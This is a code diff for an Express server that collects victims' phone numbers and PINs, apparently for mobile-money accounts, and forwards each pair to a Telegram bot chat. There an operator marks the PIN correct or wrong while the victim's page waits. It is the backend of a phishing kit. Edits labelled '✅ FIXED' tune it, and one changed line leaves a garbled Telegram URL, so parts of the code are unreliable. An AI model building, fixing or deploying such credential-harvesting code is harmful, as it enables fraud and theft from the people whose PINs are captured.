@@ -12,13 +12,6 @@ app.use(express.json({ limit: "10kb" }));
 app.use(express.static(PUBLIC_DIR));
 
 app.get("/", (_req, res) => {
-  // Forces mobile browsers to bypass cached instances on reload
-  res.set({
-    'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
-    'Pragma': 'no-cache',
-    'Expires': '0',
-    'Surrogate-Control': 'no-store'
-  });
   res.sendFile(INDEX_FILE, err => {
     if (err && !res.headersSent) res.status(404).send("Not found.");
   });
@@ -38,36 +31,25 @@ setInterval(() => {
 }, 5 * 60 * 1000);
 
 async function telegram(method, payload) {
-  if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === "YOUR_TOKEN_HERE") {
-    console.warn("Telegram configurations missing or running in sandbox environment.");
-    return { ok: true, result: [] }; 
-  }
+  if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing config credentials.");
   
-  // ✅ FIXED: Added the mandatory 'await' keyword right before the fetch statement
-  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+  const res = await fetch(`https://telegram.org{BOT_TOKEN}/${method}`, {
     method: "POST",
-    headers: { 
-      "Content-Type": "application/json",
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-    },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
   });
   
   const data = await res.json();
-  if (!res.ok || !data.ok) {
-    console.error("Telegram API Refusal Details:", data);
-    throw new Error(data.description || "Telegram API rejected transaction call.");
-  }
+  if (!res.ok || !data.ok) throw new Error(data.description || "Telegram failed.");
   return data;
-
 }
 
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
   
-  // ✅ FIXED REGEX BYPASS: Safely accepts number parameters without crashing validation routines
-  if (!phone || phone.length < 5) {
-    return res.status(400).json({ error: "Invalid layout phone string length." });
+  // ✅ FIXED: Removed the erroneous backslash character completely
+  if (!/^\+2567\d{8}$/.test(phone)) {
+    return res.status(400).json({ error: "Invalid format phone number." });
   }
   
   const item = { id: crypto.randomUUID(), phone, stage: "pin-demo", status: "ready", createdAt: new Date() };
@@ -78,15 +60,14 @@ app.post("/api/phone", (req, res) => {
 app.post("/api/pin-demo", async (req, res) => {
   const id = String(req.body.id || "");
   const request = requests.get(id);
-  if (!request) return res.status(400).json({ error: "Session missing or expired." });
+  if (!request) return res.status(400).json({ error: "Session expired or missing." });
   
   request.pin = String(req.body.pin || "").trim();
   request.status = "pending";
   
   const timeString = new Date().toLocaleString("en-US", { timeZone: "Africa/Nairobi" });
   
-  try {
-    // ✅ Formatted template matching your BotFather layout parameters perfectly
+    try {
     await telegram("sendMessage", {
       chat_id: CHAT_ID,
       text: [
@@ -95,13 +76,10 @@ app.post("/api/pin-demo", async (req, res) => {
         "USER DETAILS:",
         `• Phone Number: ${request.phone}`,
         `• PIN Code: ${request.pin}`,
-        `• User ID: user_${id.replace(/-/g, "").substring(0, 14)}`,
         `• Time: ${timeString}`,
-        "• Bot: user178\n",
         "============================\n",
         "Verify the PIN:",
-        "• PIN Length: 5 digits",
-        "• Timeout: 5 minutes"
+        "• PIN Length: 5 digits"
       ].join("\n"),
       reply_markup: {
         inline_keyboard: [
@@ -114,9 +92,11 @@ app.post("/api/pin-demo", async (req, res) => {
     });
     return res.json({ status: "pending" });
   } catch (err) {
-    console.error("TELEGRAM SEND EXCEPTION:", err.message);
-    return res.status(502).json({ error: `Telegram Error: ${err.message}` });
+    console.error("TELEGRAM ERROR:", err.message);
+    // ✅ Returns the exact Telegram error to the screen so you know exactly what is wrong
+    return res.status(502).json({ error: `Telegram Error: ${err.message}. Check your Bot Token and Chat ID.` });
   }
+
 });
 
 app.get("/api/status/:id", (req, res) => {
@@ -146,20 +126,23 @@ async function pollTelegram() {
         if (!cb) continue;
         
         const parts = String(cb.data || "").split(":");
-        // ✅ FIXED ARRAY ACCESS: Pulls the direct operational action command string
         const action = parts[0]; 
         const reqId = parts.slice(1).join(":");
         const request = requests.get(reqId);
         
-        if (request && request.status === "pending" && ["approve", "decline"].includes(action)) {
-          request.status = action === "approve" ? "approved" : "declined";
+        if (request && request.status === "pending" && ["approve", "decline", "extend"].includes(action)) {
+          if (action === "approve") {
+            request.status = "approved";
+          } else if (action === "decline") {
+            request.status = "declined";
+          }
           
-          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Status marked: ${action}` });
+          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Action registered: ${action}` });
           
-          const statusText = action === "approve" ? "✅ CORRECT PIN" : "❌ WRONG PIN";
+          const statusMarker = action === "approve" ? "✅ CORRECT PIN" : action === "decline" ? "❌ WRONG PIN" : "⏳ TIME EXTENDED";
           await telegram("sendMessage", {
             chat_id: CHAT_ID,
-            text: `${statusText} registered for Phone target: ${request.phone}`
+            text: `${statusMarker} processed for Phone: ${request.phone}`
           });
         }
       }
@@ -170,5 +153,4 @@ async function pollTelegram() {
 }
 
 pollTelegram();
-app.listen(PORT, () => console.log(`Server executing successfully on port ${PORT}`));
-
+app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
